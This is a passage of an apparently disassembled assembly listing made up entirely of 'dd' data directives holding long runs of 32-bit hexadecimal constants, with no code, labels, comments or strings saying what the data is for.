		dd 24D960BAh, 0C514D07Bh, 0BC6A5A9Fh, 47651909h, 0B07EA365h
		dd 7E0D1460h, 580A6DEEh, 486FB773h, 19B1B6C4h, 0AE1C43D1h
		dd 0C08B55A6h, 0D94B08EAh, 2087A286h, 92EC379Bh, 85522D62h
		dd 7E3DC90Fh, 66B3213Ch, 9A9334BFh, 9F20FAA9h, 18E568F6h
		dd 6C09AE16h, 6768A90Dh, 911151D2h, 2371DA71h, 0BC91F05Fh
		dd 932AA0EEh, 1A0C22EDh, 54BE0E04h, 5768444Ch, 0BC317D63h
		dd 95AE7725h, 5CD92719h, 311AD8AAh, 1F0839B9h, 46576521h
		dd 0CC23420h, 0A9A43DE8h, 801ED747h, 0F506DB0Dh, 2DE78E80h
		dd 21599D3Dh, 92E949B7h, 0C6AB94FAh, 1E0D8156h,	6B18F905h
		dd 0A444094Bh, 0C221DA51h, 0BF3137A5h, 0D61E063Dh, 20AE42EEh
		dd 0A0D2CBD9h, 523D2032h, 0F6124F3Fh, 0B957FFD6h, 5B8C2AFFh
		dd 6050227h, 2B38651Dh,	91644CDBh, 0D38AC761h, 0B4A0DFEDh
		dd 9369980h, 1C163AC0h,	0CC15E60Ch, 151A8042h, 0D18933FBh
		dd 0DC23F0A7h, 0F2EFF1D3h
		dd 54E46702h, 55CAAABDh, 3ED34FFCh, 102C0360h, 64278EE0h
		dd 891288E0h, 826FA0AEh, 9FB9082Fh, 0E9323E57h,	0FEE02661h
		dd 7F2D04D7h, 0ACC8E5F2h, 6C40A71h, 153D4241h, 10E09CFEh
		dd 0CD7FFF7Ah, 0B9D6F93Dh, 6773E36Bh, 0B2A0E078h, 6E82C8F4h
		dd 1D3B58B5h, 903DA35Ch, 0F50F1DB6h, 0C0F3B767h, 0B4C40FA6h
		dd 534780DFh, 0B0F79C1h, 0B7A5B2FBh, 69845DCAh,	2D3CB58Dh
		dd 254C915Fh, 0DF051F69h, 53944706h, 0C0F0ADB9h, 5E5C02A4h
		dd 9814E9FFh, 0EEFE2B50h, 0B4218819h, 0D8A445E8h, 7519EC72h
		dd 1A379F2Fh, 2C409B9h,	64C7B8A1h, 847D16F2h, 1E7DDC25h
		dd 1EA34B50h, 30A9490Dh, 0BA80A486h, 27A1095Fh,	0A1A55E5Dh
		dd 0B3C927FCh, 5B533385h, 0BD1B8D46h, 0A0E37917h, 53FBE62Bh
		dd 1B3A1h, 81C7E381h, 19B9C331h, 41133639h, 0B25AA381h
		dd 0D0371AF1h, 0A85A20DCh, 36506D8Bh, 5543D41Fh, 0D79538E2h
		dd 0A2388DA9h, 38C0D173h, 13A70CB6h, 1722B734h,	35B00875h
		dd 0CB6C05A0h, 0D52072D3h, 0D7D9E467h, 690DB770h, 2C1A41C3h
		dd 5F4D087Dh, 0E5B17ECh, 36932395h, 12E63587h, 364D3224h
		dd 39C5530Fh, 32B0DD34h, 4C55BEF0h, 7F06A929h, 9344C677h
		dd 0E7F0EB25h, 96A9CA7Ch, 0FE058403h, 0C8AE44B3h, 35A6CF40h
		dd 0DD8728C1h, 7F311C89h, 0EA29CD65h, 0BC3179C2h, 0DDF8AE34h
		dd 0CD6FF8A3h, 0B544D740h, 0C2B045B8h, 205C149Eh, 0FEF6B6D5h
		dd 669A732Fh, 0E0B13ADFh, 6BBF0640h, 0F136E335h, 0A1A5E13Ah
		dd 0A386D32Eh, 0F1C1F7D9h, 52B865F7h, 92E3F0DCh, 23EC5010h
		dd 0B5978A41h, 6EEB23DCh, 8D16DC9h, 0D2CDAD07h,	28937243h
		dd 9F7DAFCAh, 0B5616796h, 0D215C10Eh, 0B0488869h, 17A55B7Fh
		dd 0E26625FDh, 9AE1B7EFh, 0F5D4FF64h, 0BEC9E83Ch, 0E7BF6F21h
		dd 0DBE311F4h, 18E130C3h, 30334A46h, 7661BDA6h,	5374A29Dh
		dd 0DBA6162Fh, 0EEA3F246h, 0A55686D2h, 4EA6AC97h, 678D1B0Ch
		dd 727D1DAEh, 3C3DA3B2h, 5A8433B3h, 0E32CB26Ch,	0F3651ECDh
		dd 9395E7F6h, 0C2912341h, 0D0F1D584h, 92C22FCDh, 0E3F2D0F2h
		dd 2833F583h, 0DEDFCB18h, 16C7FEBFh, 7FB48D8Dh,	84F6339Fh
		dd 13381287h, 31190ED4h, 0BBBEE22Fh, 662E4834h,	0C598E9BCh
		dd 0D8FDFFB2h, 0F4FCE810h, 423C43ABh, 74C28E3Ah, 0A503D5FAh
		dd 0A1B269Fh, 0B694C9BAh, 41883BC6h, 0F865EDBh,	591A4F12h
		dd 61E0273Dh, 0E866DF8Dh, 0B42E4FCEh, 0CA0BC246h, 87879E1Eh
		dd 5186CE9Ch, 5539472Ah, 5CE966C0h, 0EDEA61D9h,	4371D1A6h
		dd 0D028C5B0h, 77200B0Fh, 2C64D342h, 5FD27D49h,	25AC6ED3h
		dd 5E48817Bh, 38EECF77h, 5562C923h, 9CE3E569h, 0DB714DA1h
		dd 726C939Dh, 750A390Ah, 9F0D78F2h, 0A563AA25h,	5399E0B5h
		dd 91443DA4h, 0B2A3E502h, 13919F37h, 0EE4CF21h,	5F16824Ch
		dd 230955A0h, 43374C33h, 0B0290ACDh, 8FB406B0h,	54D5B9h
		dd 0BDAC92ACh, 23B4CF99h, 46FA9C20h, 0FA7D30FEh, 388C420h
		dd 1472B840h, 11FCB20Ah, 57FC9291h, 3341D477h, 98FBA838h
		dd 1CAFC59Dh, 0A058B359h, 0A58C9DC8h, 35EAEDF5h, 213287E6h
		dd 3C232E6Ah, 0A761623h, 0CAFED8F4h, 0FC635C93h, 0A838278h
		dd 5244CB9Ch, 806ADA69h, 779313BCh, 39216634h, 6B591558h
		dd 52595582h, 0D229920Dh, 38D41C81h, 2B6D010Dh,	0F19DF4E8h
		dd 76100D3Fh, 8DC8986Eh, 99926EA4h, 0E9847F76h,	500F6A8Fh
		dd 0DEE40FA8h, 2820F6F5h, 52F719A9h, 0E83015CBh, 96990ECFh
		dd 0D39DA748h, 8BFE5C0Fh, 618EAFFAh, 59E26E37h,	35A4D981h
		dd 8EDB5FA3h, 4B7F9C53h, 0EBF0FEA9h, 3273B98h, 0CF89AD72h
		dd 0EB5769A0h, 5CBC248Bh, 194F5910h, 2F9786C8h,	0C2260984h
		dd 0E658A991h, 78743D2Eh, 1D35EB77h, 0AD84703Bh, 390834E7h
		dd 7A72DBFBh, 69C7A4A3h, 5E926263h, 105ADA16h, 4FC4477Fh
		dd 43E43DDCh, 0CCAF9561h, 60EF310Ch, 13323613h,	0C098FF69h
		dd 0CFD6C75Bh, 31CDF368h, 5DEA6BCFh, 69BA4DD7h,	0E865126Fh
		dd 754C4283h, 0FF2C0BBFh, 4EEC30Fh, 0CC2D61D8h,	0A1B62E3Ah
		dd 9DC1390h, 0B7370271h, 0B6C4449h, 79814DF6h, 9719AB6Dh
		dd 1449F702h, 0D5CB58A3h, 6354F31h, 26AEBF70h, 8328E43Fh
		dd 3C626AA4h, 8AA24DC6h, 116B2A53h, 2A33411h, 77C484CEh
		dd 0A738D3AEh, 0EE35E3D2h, 945A1442h, 3D402E02h, 0FFCE1107h
		dd 3B6D09E3h, 16591BF0h, 3FD21E1Fh, 449136EFh, 9DD8809Dh
		dd 1E7F1D14h, 28890BBEh, 1F2110FEh, 1F8EFBE7h, 0A08340E2h
		dd 0DCAC7B61h, 0A32954CBh, 0FB8CD244h, 27691BE9h, 0C34B6461h
		dd 0B7D47C47h, 406131E1h, 936E2D47h, 432891DAh,	86593950h
		dd 25B8972Bh, 9B3761BCh, 0D40F3E54h, 0FD643956h, 0C2A2616Bh
		dd 0B7373A1Fh, 7F215690h, 0A96DB118h, 12801406h, 7AF4FBE8h
		dd 3A9F2FBCh, 0BB3BA6DDh, 28184CBEh, 1C040659h,	2100976Eh
		dd 0FC341F2Ah, 84C744E6h, 1B2BE04Bh, 6120C348h,	2311BC25h
		dd 613EF019h, 5BFC39A0h, 7385113Bh, 0E3D3C8A5h,	237E3457h
		dd 85954A8Ch, 0AF4A2EF8h, 61B33F04h, 94150B8Eh,	1CF58933h
		dd 0FFB62F50h, 2B34F2DDh, 9BF755Eh, 20452864h, 3AEE5AB9h
		dd 3AE95C17h, 27F61623h, 0AFA1F958h, 613590E8h,	34E047D0h
		dd 6ADE726Ch, 42FE5D50h, 0E18374D3h, 1717F22Ch,	0D64BFDBEh
		dd 386B80CFh, 109F2390h, 9BA5604Eh, 0A38E6FF1h,	0D1D25CB7h
		dd 0BA067CB7h, 14A6560Ch, 782D5D78h, 0C7002D2Eh, 61A9396Ch
		dd 5BC5B647h, 542234A6h, 0A3F78E9Bh, 9A0B182Ch,	0AB5577CFh
		dd 0FA1C9088h, 8DE1628Eh, 8BFA43h, 7F5C54ECh, 77521FC3h
		dd 0C7A6D11Ah, 224708BEh, 12233B26h, 1C598C62h,	5D6FE65Eh
		dd 0B647DA75h, 0FD65A2E6h, 0C5213A32h, 0C60CFDCFh, 62A22178h
		dd 93A375CBh, 6A5C2AE7h, 0A378DD51h, 47FAFEE3h,	0B65C7A13h
		dd 9B5D8E53h, 641AF08Bh, 324528E2h, 0B2824B96h,	8AB9782h
		dd 8FD6E75Bh, 0CDBA6FF1h, 0ACA88CE7h, 4D2DCE60h, 299D2FCFh
		dd 0DDE192A3h, 5222CA4Eh, 0BF982AB5h, 5E20ECE8h, 0F2E9A42Dh
		dd 5B8F3545h, 0DAB9DFF7h, 0E69A94A4h, 0F1B8F074h, 2EE53E36h
		dd 0A4654000h, 0CC9200C3h, 327D9754h, 0BD2A199h, 5D52822Bh
		dd 5D528FC1h, 2FF9448Ch, 7E9CE3F5h, 2C3A288Fh, 7577EB64h
		dd 22AA6464h, 277ED77h,	136B542Fh, 0BA9275BEh, 324B9722h
		dd 0FC85C2F6h, 5B6204CBh, 0EE486337h, 44D5C76Bh, 5D8FC0D5h
		dd 7DD8D3EEh, 34293740h, 1490782Fh, 6DCD1516h, 0A871227Ch
		dd 0FE8999EFh, 58064595h, 551ED63Ch, 0EEC544F2h, 9B2151F5h
		dd 0DF9B669Bh, 0A6523D27h, 0C14C179Ch, 0EDE67FFh, 31D0441Bh
		dd 7A2813D4h, 68BA9053h, 0C592E3BFh, 0C2FDAB5h,	0E2EA659Ah
		dd 18677D29h, 5A20512Dh, 0B22FCAD6h, 1B5E9A60h,	1BD27B50h
		dd 1758DC27h, 75E05875h, 39972D43h, 0D8CD34AEh,	0F90F9982h
		dd 0CC005B3Fh, 4D7A9097h, 0B98DC70Ch, 0FFE79263h, 0E8FF5E63h
		dd 0D27B2C71h, 2CBCB3DFh, 0DE0E697Fh, 3341FC9Eh, 0BC9B9ADh
		dd 477802E6h, 0C395D852h, 27559CB4h, 5E7FF0C8h,	0A29992D7h
		dd 41FD1E27h, 40E0BF80h, 8915B23Dh, 3FEB1CDAh, 1B43689Fh
		dd 30E0C121h, 8CB2C232h, 16AC8405h, 14A48010h, 79355005h
		dd 682FDBF7h, 2F4CB788h, 7C2D19CEh, 7501D620h, 0F43F29ECh
		dd 0EB57324Eh, 0D7F82892h, 90C1BC1h, 7D3B96E9h,	0A7D722FAh
		dd 0EC2E760Fh, 486AAF90h, 1171B72Dh, 44996DD9h,	0B25CCC62h
		dd 0B51C7804h, 0DDA16084h
		dd 6CFF46B1h, 2EE8FD75h, 0A18029AEh, 17724DBAh,	0CBCA59D0h
		dd 2CF746E7h, 3628FE4Eh, 0BE66422h, 0E3115522h,	0AA70792Ah
		dd 67BBBE0Dh, 4E7AEAF6h, 475D12E0h, 80004925h, 6AF8388Ah
		dd 0BE11AA23h, 89826A06h, 0D4830063h, 75277574h, 0EBA203A6h
		dd 0EF29FCB8h, 16551457h, 0CD65F719h, 0AE59BBBCh, 0A6006775h
		dd 81859F58h, 0ECD65493h, 700EE612h, 0DE43BEB3h, 30B1B43Ah
		dd 49A71F36h, 496FEDBBh, 2B5B6C4Fh, 777AB17Ch, 6DF3AA55h
		dd 0A2B264B0h, 0BC90DA50h, 50B195C6h, 5CAA8449h, 97BECE65h
		dd 7367367Ah, 0C78B306Ah, 0E0C75CC1h, 0C3125501h, 3F543F6Dh
		dd 0B9280318h, 0AC1C4DC9h, 34657A9Ch, 0BD64FA4h, 0F1189415h
		dd 3F4798CDh, 0E747A021h, 9FC67C6Dh, 2AD4E6BBh,	6FE691C3h
		dd 4B2598CFh, 0B2D7E29Ch, 0F6E56501h, 0B8C907E0h, 13A2E519h
		dd 3544E3EAh, 60AE8B00h, 6BCBE722h, 593FDCAAh, 0B83D8F26h
		dd 9867D7BEh, 0EC39AFB8h, 408CF058h, 0DC84B049h, 6C50F27Dh
		dd 0E08A4543h, 0D2AD762Eh, 1F575447h, 89ABC5C8h, 6369A768h
		dd 661BEC0Ch, 335270B1h, 574BC99h, 949D791Ch, 1737FC0Fh
		dd 924BD5E8h, 8AFE1EDBh, 67C1E11Bh, 38062ADh, 8C710658h
		dd 0BD8D63E0h, 0D0A38450h, 0E62915E6h, 3A41587Dh, 7357E26Ah
		dd 1E3F9117h, 0ED12380Dh, 3E81AFB1h, 986CAB80h,	3BF8E4CFh
		dd 9926FCD1h, 0B570336Dh, 0FD43AF9Ah, 0B45142A5h, 3354D8E2h
		dd 1C7F6243h, 0F6A678A2h, 513127BCh, 0EB44D273h, 586C5B43h
		dd 0B9549C92h, 0FA1E4EA0h, 29565241h, 0B9AEBB10h, 0A8C0E37Fh
		dd 0D03945FEh, 4B781A0Ch, 50ACE0E5h, 57B1EA82h,	3172F273h
		dd 0E7950DD8h, 328505F8h, 0E8FB65EBh, 8230015h,	7520AA3Ah
		dd 0F0D7F3Bh, 0A92081DFh, 0F688C433h, 0EEAD13CDh, 0F0E12721h
		dd 1D92CCD3h, 0A0A5BB5Ah, 452DC077h, 0E48A7397h, 24D3689h
		dd 0B85C12C0h, 0E14D52BAh, 64158CB8h, 0D5E9D796h, 0F438783Fh
		dd 2FE7473Eh, 19AD2343h, 7949D9A2h, 0AA7CB474h,	46127859h
		dd 89C218FEh, 2719F15Eh, 0F0FD7D30h, 6F55EBFh, 0EAA716C2h
		dd 0E0D77DD4h, 12750030h, 0F017348Ch, 78694E35h, 2263FF0Ch
		dd 0D194B39Eh, 3565D7CEh, 0FAF8CBA0h, 314289BFh, 5338Ah
		dd 411AEB0Ah, 0DAE31D80h, 0C1AA430Bh, 0B1D2A641h, 97EC1577h
		dd 66DF09EEh, 3B11FB33h, 1E880D72h, 0A5D01CD5h,	67851289h
		dd 0A614D09Ch, 774F7261h, 0ABDBE6BCh, 65092B8Eh, 43A5A7BDh
		dd 0F68B9795h, 4E762304h, 9B88CB1h, 0EF268D75h,	89B220DCh
		dd 5FD4C260h, 0E8B50F3Ah, 89AA054Fh, 527F3DE7h,	4D2A76DFh
		dd 7080D370h, 578D05Eh,	11A5ACE5h, 0A39EF28Ch, 5C9B99B8h
		dd 0E89306D4h, 4308B301h, 6A75823Fh, 667A117h, 4C4CEC00h
		dd 0D16DB693h, 930B1B13h, 0B233666Dh, 0B5F6C006h, 0A705AA29h
		dd 6C1FA0C0h, 6DAF42DBh, 6A4DE12Fh, 0E9818FA8h,	0F36E13C7h
		dd 0F161824Bh, 2EBC6A78h, 0FC8F188h, 4D81E6E2h,	0F21F21C5h
		dd 38639338h, 4ACB5BAFh, 2E91AA74h, 0B6C19F45h,	0D1BCFCABh
		dd 58B5080h, 0C3EE266Bh, 0FD00F04Bh, 4F760098h,	72AD8C92h
		dd 16EA7E1Dh, 2103F1B0h, 0A4DFF514h, 9BEDD47h, 43516E86h
		dd 3D436D1Fh, 0F64FECFh, 23D8CCC0h, 39095DDh, 7EB4293Dh
		dd 546FBC9Ch, 2E8BE31h,	0A0FB5954h, 99E150DEh, 4E39B63Fh
		dd 0E10C7CC5h, 0D52A39AAh, 0D3B8A2E1h, 9983A174h, 0DEA42033h
		dd 0F01F267Ch, 9B0D34F5h, 0B6539B53h, 6C2958A0h, 8F000FC2h
		dd 19ED3728h, 0E83F2A2h, 7BD30CE5h, 8679C615h, 2801F581h
		dd 16B03641h, 2BD7E67Ch, 0FF01A8B0h, 0A14F5018h, 685AB196h
		dd 0C8FD3345h, 0BE4BFA47h, 0D80ACBAh, 9C12CF22h, 67F1472Ah
		dd 3E07620Eh, 7606CFD2h, 0FB53DD96h, 44B5EE85h,	586F00Eh
		dd 0B76631C4h, 0EB522821h, 9513CBD5h, 7271DA56h, 0CB220593h
		dd 2E2AAC6Ah, 0C04DB3B2h, 919A8837h, 0BB5841A8h, 0BC4FFD0Fh
		dd 347BB950h, 0E2B00862h, 48AB259Eh, 4A2044B3h,	2F0F062Fh
		dd 0D905CC27h, 0AF50F81Ah, 0CF7ACFBAh, 93961B2Ah, 4EB56C49h
		dd 0CBB8F6D5h, 3B316A80h, 52D82A00h, 0D07E6755h, 98F1ECEBh
		dd 70E5CAFBh, 0DC5B54A7h, 0F2BC82Ah, 93189CE6h,	2CE482D7h
		dd 88B3EE8Dh, 5E3B170Ah, 6E52B79Fh, 1444CCFCh, 63E3ED14h
		dd 184530EFh, 4B7B774Dh, 734B0984h, 5757756h, 0D534515Bh
		dd 0C131CF88h, 0A15332AAh, 0B3FCFC44h, 0E230A341h, 1509BC6Eh
		dd 0CB51D786h, 6DB69E02h, 87FC695Ah, 0C38FBC0h,	0D5B3FF5Ah
		dd 46E3F2D6h, 6297AAEDh, 5F2A4A6Bh, 0FB0A6193h,	0CD38DF20h
		dd 559BE4DEh, 0B1F83889h, 3E34B0F6h, 0C3C7664Ch, 0CA71D704h
		dd 3C7A5132h, 8C827E6Ch, 0E6F5CFF4h, 927A108Ch,	0B16D5D29h
		dd 1DF4CEF8h, 0F1C5E8E4h, 0EC3D0896h, 0DC6BE183h, 9EB0F9F1h
		dd 0C3C010D8h, 0C23B3E02h, 8AFBEDF0h, 0C3050DC6h, 7B3C99F7h
		dd 0C1BABAB0h, 6F85D9A2h, 0AC0BBD01h, 0E5E2D85Ah, 594BA2BDh
		dd 5B03254h, 0D00A74C9h, 2669B055h, 0AB6E0D58h,	5C2FB4DCh
		dd 5667BB88h, 14E55189h, 6119AB5h, 9D29805Bh, 9B09A84Fh
		dd 26E42DCBh, 0C2E6582Fh, 1A4A5991h, 0FF745C41h, 28DE5018h
		dd 0AFDFD5A6h, 767F92F8h, 147A8D40h, 6C873CC4h,	0F7BD4CC2h
		dd 0F4183DF0h, 0DF57E780h, 74630334h, 5A8BC5E9h, 839FAB2Bh
		dd 8622B5E6h, 0C00519BBh, 72201FCBh, 0A81DA683h, 48775FF7h
		dd 74C9F772h, 48EF722h,	0D9A5ACD0h, 0D0210D7Bh,	58E2F9D4h
		dd 2E247422h, 0F13D500Bh, 14040ED8h, 93A70B01h,	5D884EDCh
		dd 183C2078h, 0FE659344h, 0AC24BA1Fh, 37DE2C7Ch, 7B3B8AB4h
		dd 62BC7AACh, 0C22AD77h, 4C03FA1Ah, 390E39E2h, 0E17F1FAAh
		dd 4CBC58D2h, 0AD67991Eh, 5EA3DB3Bh, 30C981A1h,	718BC198h
		dd 78782FBEh, 34937663h, 0DE80036Ah, 43FE782Fh,	865BC247h
		dd 2A3D9EC2h, 5EC55C2Ah, 3DF59008h, 0D00E074Fh,	0A421CB08h
		dd 674A9CE2h, 5DA46F91h, 0D733844Eh, 0CB608D10h, 321D4860h
		dd 6C3134CBh, 3BF7DA67h, 3A537097h, 0A6825F1Ch,	920282ECh
		dd 47574305h, 0F32A94ECh, 9FAD600Dh, 367BDED9h,	3051766Ch
		dd 0E20EA64Ah, 3793A183h, 9E5160Fh, 40ACADCEh, 77447C3Fh
		dd 3E42D2D1h, 0F0A44BC3h, 53EB018Bh, 6EA6024h, 0FA999599h
		dd 59701565h, 0F3E2BA6Ah, 0CFABBA5Ah, 0E1610A64h, 72CF71C1h
		dd 0A00EA747h, 0AEB9A8EDh, 0FE95101Ah, 443EFF40h, 3B5EE754h
		dd 5A465F6h, 681DCA36h,	0B35D0ED4h, 0C04E908Dh,	5426E20Ch
		dd 0F54E5ACBh, 791596A0h, 54365986h, 0C1729559h, 219F4E64h
		dd 0A2DDFFADh, 8BB6BCD2h, 9A25A9C6h, 0E9418F3Fh, 0B2397550h
		dd 550FEDA2h, 0C155350h, 0ED5B3889h, 0C845F20Ch, 512069Dh
		dd 439F0B5h, 6BA4EBDh, 0BF2D9FFBh, 453C3EA5h, 0DA06D16Fh
		dd 0F8142BAAh, 702A62A2h, 0A6609A20h, 2355BDA6h, 9D44658Ch
		dd 0F732A74Dh, 74E8B10Dh, 0CBEDE967h, 0E25B7C66h, 1FB9B3E7h
		dd 0E2A2EC76h, 5C2A66B4h, 865B8D89h, 831AA432h,	3BE364B8h
		dd 871488D1h, 78D7C07Bh, 26EA4768h, 288F07E3h, 625D892Eh
		dd 0D121D178h, 42B7ACF5h, 0D83CD0C5h, 78F00AC1h, 9FE86F22h
		dd 1F763CB3h, 873DAD2Ah, 0F69B9964h, 0D752294Ch, 0D32475B8h
		dd 5D05A1ACh, 0DE84484Dh, 0E4E17ED7h, 0F1AB5D43h, 0E9C61879h
		dd 529E0CD5h, 32830921h, 8FFA3C90h, 187B104Dh, 82AE95E7h
		dd 3261A8Eh, 0C09F5BF5h, 1B51C888h, 0AFDF24Dh, 6366F04Eh
		dd 2ED5FC99h, 9935F038h
		dd 0FB6F7A3Ah, 0F3876823h, 6F47EA41h, 37159945h, 3F81E4Ah
		dd 0DED2809Bh, 0A93624Ch, 0B8182AC7h, 34E4FB2Bh, 923CFA73h
		dd 8562049h, 2B882768h,	9A1B7E18h, 33F4CA15h, 2D3E8CD7h
		dd 78ABA376h, 28E653C9h, 617AD332h, 0D1CEC8B1h,	3EA8D836h
		dd 82D60425h, 1B4EBE08h, 2D776D49h, 5F359898h, 0BFF0F6C0h
		dd 6B92A3BBh, 6BBCE961h, 2585544Eh, 0E4883308h,	0FCCD988Fh
		dd 0E1F2F295h, 7849DC69h, 7937CEFEh, 6AF77BDDh,	467D6149h
		dd 72AF4C57h, 0BF20000Eh, 0AB1CF01Ah, 968A3560h, 0D9490E2Dh
		dd 0A50A2A6Eh, 2077B0F1h, 7FEFF52Bh, 21C5005Eh,	0A521E190h
		dd 0F7927B03h, 254E3372h, 9ED618DBh, 906E8469h,	0ADB70DD1h
		dd 454FC271h, 98ED444Ch, 816AB7EDh, 832C7221h, 9E2A3B12h
		dd 63C60EAAh, 769B1E8Bh, 0E085CEC5h, 0C56E7863h, 0E98E25C6h
		dd 0A8FB9B0h, 0C36E46D5h, 0C99552F8h, 0C3FD466h, 752F5B25h
		dd 16823C20h, 0C5391305h, 0D877E71Dh, 2B6ADB92h, 1F1F8E60h
		dd 685043C7h, 0D5A05EEBh, 0AFF381EDh, 0BC69EDC8h, 6184D14Eh
		dd 0D7512530h, 0C5BFD201h, 5A819EA4h, 0FDFE0FB1h, 2355B829h
		dd 0A8A904DFh, 6E11094Bh, 5BDAFAC8h, 4ADD845Fh,	0FA47C442h
		dd 675E5526h, 0BA962C34h, 0A9ED01F1h, 3C85A32Fh, 618581ABh
		dd 2189253Dh, 1C3F789Dh, 73436B00h, 1494D9BAh, 5B35E1C2h
		dd 2D0F8884h, 73BE8DAAh, 0B6A692BAh, 95D34F2Dh,	0F13FBF43h
		dd 41BF143h, 76A194FDh,	0D0386803h, 40D1C15Eh, 56106007h
		dd 0CA9A3260h, 756D74C6h, 0C09B2C4Ch, 6302AB0Bh, 0A5B760C9h
		dd 0B2D78998h, 2720F674h, 0FD804892h, 58F5D5FDh, 45AF0BC9h
		dd 95AC0073h, 0BF576604h, 0BBEC3BD4h, 8D96D036h, 3692E210h
		dd 0F3C75EB8h, 0B45D7904h, 7071A6D4h, 0E929941Ch, 3429E0E2h
		dd 0ED62DF1Bh, 3A6C76A1h, 250D177Dh, 3125FEE0h,	176BC86Fh
		dd 4D6774A4h, 11735D25h, 7DEEB63Dh, 9DCBA7F4h, 9DA93651h
		dd 0A3B15BBh, 3458F1AFh, 8B06B99Eh, 84F3B542h, 4C32FBCBh
		dd 60A5481Dh, 98354539h, 20F1E963h, 6AA133DCh, 45BCDF6Ch
		dd 8E3C9E4Ch, 0DC878228h, 0C40553F4h, 93F6BA0h,	0F9017CC9h
		dd 4EC7DCF3h, 822259F2h, 2CFE867h, 516487Fh, 0B8FCD2C2h
		dd 9E3B7DA4h, 6834C7EFh, 0F7ECD50Ch, 0F0C5B258h, 0D8934172h
		dd 8473426Dh, 0B8273429h, 0B22C97DAh, 3FB047EFh, 916129D5h
		dd 8140FE4Dh, 0CEEDCA18h, 7CC02A4Ch, 8056861Fh,	0D39E16C6h
		dd 0A96FAC0Dh, 5435AEB1h, 5CA61BE6h, 2557A622h,	0E6416B5Eh
		dd 0ED50245Eh, 5CD81FACh, 0A70DD7DBh, 0C8AE600Ch, 67675638h
		dd 366B3ACDh, 545CDF87h, 0F0980AFFh, 17A40F8h, 0BD144E43h
		dd 0F129454Fh, 6DB60ACEh, 88A379DDh, 0CA5BA73Ah, 63A16185h
		dd 3FD77083h, 75BD221Ch, 0BA931AADh, 0DA530177h, 77D0355h
		dd 0D50F76FBh, 4DAC5F29h, 0C66F6376h, 1B31DB52h, 8191350Bh
		dd 17444E22h, 769414E9h, 777BE3Bh, 0F3378319h, 0E0F9052Ch
		dd 0FCC4820Dh, 437E62Ah, 0F028722Fh, 8885D71Ch,	2A2AA369h
		dd 666529B4h, 997AF597h, 9316074Ah, 0C53B1D3Ah,	4EB6DEC7h
		dd 52C37370h, 50F5AFE1h, 802D5A15h, 23117D14h, 0A2AD6665h
		dd 5F9E9CC4h, 29D27CA1h, 0CFC197AEh, 7B9FABADh,	0B737E5B6h
		dd 0F30C3620h, 582BCBABh, 35094AE6h, 0E9C1AC2Ch, 29651949h
		dd 0A71433FAh, 349710C9h, 8B3F281Ch, 8DA9006Eh,	8957BC03h
		dd 6A9DFBE3h, 0E354F81Dh, 9D296548h, 8FBC6D3Bh,	12164A38h
		dd 51D76F20h, 73649592h, 0E8CC032Ch, 0CD856583h, 0A110B6F6h
		dd 7AF68CFh, 4024B080h,	0D719956Ah, 5F4D975Bh, 2F7E65BDh
		dd 0ED837541h, 1E3C5468h, 134F28B6h, 0C8E5C553h, 9B3F0678h
		dd 21B87F28h, 3A9879Ch,	69F10A88h, 811FD8B6h, 50B36090h
		dd 0B5394ACBh, 0AFAF3C0Ch, 0CC663248h, 46D223Ch, 820C7077h
		dd 63879A2h, 4298A148h,	0D1174422h, 75778BE9h, 822C2FE4h
		dd 3683440Fh, 0F89A6BEEh, 0DF17254Ch, 346B23D7h, 12CE776Bh
		dd 4D7F8DC9h, 0A08AE20Ch, 5DD1E9C6h, 0DF0EA5A8h, 234AE6F2h
		dd 82D5C688h, 706227B6h, 0E3A217E1h, 0D648B4B9h, 5998D511h
		dd 0EED69F23h, 39E0B0A7h, 60B84C5Eh, 7772CF33h,	96BE8636h
		dd 41B7BD27h, 0B56B5213h, 2CFA8826h, 0E287B4E7h, 14126375h
		dd 0AD70A07Ch, 86A0E009h, 2A9A12BFh, 14714BDAh,	0C8618C01h
		dd 0BDFCA529h, 0E0E5692h, 9D3A40Dh, 291F6525h, 2A4DE6FEh
		dd 0AD3D5053h, 7491533Ch, 0EC5A8712h, 1F4696C0h, 0E1CB264Fh
		dd 0A532387Fh, 484141C3h, 297AEDD4h, 749AE881h,	6366A23Eh
		dd 0D108593Eh, 9992B10Ah, 82D5441Bh, 23D3A934h,	0E8AFBB28h
		dd 979E6F0Eh, 5C4367F2h, 52BF4E57h, 0D0396355h,	4C0C400Eh
		dd 3A30B151h, 0B46B2004h, 742FA5DEh, 75AF8646h,	1CA14EE9h
		dd 0E33FDE15h, 77F583EFh, 3A3F24BFh, 181D1846h,	9884DC2Dh
		dd 4F8D1C5Ah, 0AE87AF2Fh, 1E283B5Eh, 0E9F0D8h, 3E39C42Dh
		dd 77549527h, 9AD83F7Dh, 46F7DA4Bh, 9D41871Fh, 0FC0C3873h
		dd 880B7D80h, 64BF6DE7h, 3C07E144h, 0EF7FD7DAh,	0BF4F097h
		dd 0AD21D277h, 0ADA4EA30h, 0AC9DF989h, 0AEB753D9h, 2FA5CD8Ch
		dd 0A58C6C6Fh, 916D5A3Bh, 0FD33E6D9h, 6AEA6EABh, 5B835A0Ch
		dd 9CBA4459h, 0CBED5830h, 5C5FCEA1h, 91338F2Bh,	592BE4CCh
		dd 0AD00E5D8h, 0F1635881h, 8ED1CC28h, 74F92E7Bh, 3A29B7h
		dd 9EF32E36h, 0F0F362F6h, 0D0D50999h, 4233E191h, 0C32BF66Eh
		dd 94D7B0E4h, 0AF7480F9h, 0B6FF5BEBh, 879FAD01h, 0B7631031h
		dd 0D5441216h, 6962279Fh, 3FA94A4Bh, 0CEF39BF3h, 0AF528136h
		dd 0DE453C9Dh, 63B4226Bh, 0C761AB6h, 0B017E0C4h, 38B9A5CFh
		dd 94AC3CF6h, 774BB400h, 0CDFF031Eh, 0D8619813h, 218858F4h
		dd 0A24EFEBFh, 0B9457A21h, 0E28EEAB1h, 16D7C2FBh, 3C47248Ah
		dd 0E291088Ah, 0AE72B762h, 0D044189Ch, 0F3FF2C76h, 0F3CB3EEDh
		dd 9314B991h, 305B474Bh, 25937483h, 6E2F979Dh, 7F875951h
		dd 119E166Ah, 0EAD7CB1Ah, 19BEB95Ah, 0E86D3814h, 76D3BCECh
		dd 37D3615Dh, 3C93F73Bh, 1414B283h, 82CFAE03h, 0F67B7A89h
		dd 26447254h, 424FF73Ah, 9098A1AFh, 0F9E213FCh,	0BF234EE8h
		dd 2FED59B0h, 72EED9B9h, 0A051629h, 0CBC52DBBh,	0E1690D2Fh
		dd 6BB4B15h, 1B773AC5h,	79C34DF7h, 0E5657113h, 42E03617h
